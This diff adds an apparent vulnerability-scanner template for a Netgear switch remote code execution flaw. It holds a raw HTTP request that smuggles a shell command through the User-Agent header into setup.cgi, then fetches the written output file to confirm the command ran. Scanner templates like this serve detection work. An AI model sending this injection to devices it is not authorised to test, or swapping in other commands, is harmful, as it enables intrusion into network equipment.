@@ -1,0 +1,33 @@
+id: netgear-switch-rce
+info:
+  name: Netgear Switch Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - raw:
+      - |
+        GET /cgi/setup.cgi';$HTTP_USER_AGENT;' HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: sh -c ls>/webtmp/{{rand_str}}.js
+    extractors:
+      - type: regex
+        part: body
+        name: rand_str
+        internal: true
+        regex:
+          - "[a-zA-Z0-9]{8}"
+  - raw:
+      - |
+        GET /webtmp/{{rand_str}}.js HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "httpservercert.cgi"
+        part: body
+      - type: word
+        words:
+          - "httpuploadbakcfg.cgi"
+        part: body
